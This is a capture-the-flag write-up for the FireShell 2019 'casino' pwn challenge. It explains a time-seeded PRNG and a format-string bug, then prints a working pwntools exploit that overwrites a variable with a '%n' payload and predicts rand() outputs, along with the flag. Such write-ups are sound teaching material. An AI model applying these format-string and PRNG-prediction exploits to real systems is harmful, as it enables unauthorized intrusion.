+++
title = "FireShell 2019 - casino"
date = "2019-01-28 06:54:28"
categories = ["pwn", "writeup"]
+++
## download
- [binary](/assets/fireshell/casino/casino.zip)
- [solve.py](/assets/fireshell/casino/solve.py)

## summary
1. PRNG seed with `time(0) / 10 + bet`
2. Guess the number game, but intended to never win the game because the loop will only reach 99 not 100
2. format string in `main` used to overwrite `bet` with value > 1, so that you can win the game

## exploit

```python
#!/usr/bin/env python
from pwn import *
import sys, ctypes

context.terminal = ['tmux', 'split-window', '-h']
elf = ELF('./casino', checksec=False)

libc = ctypes.CDLL('/usr/lib64/libc.so.6')
seed = libc.time(0) / 10

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = elf.process(aslr=False)
    gdb.attach(r, 'brva 0xac3')

payload  = '___%11$n{}'.format(p64(0x602020)) # overwrite bet with 3
r.sendafter('? ', payload)

libc.srand(seed + 3)

for i in range(99):
    ans = str(libc.rand())
    print r.recv()
    r.sendline(ans)

r.interactive()

# F#{buggy_c4s1n0_1s_n0t_f41r!}
```

## footnote
should be fairly easy, but connection problem in early CTF will get you timeout before reach loop end. Tried this a couple of times before getting a good one.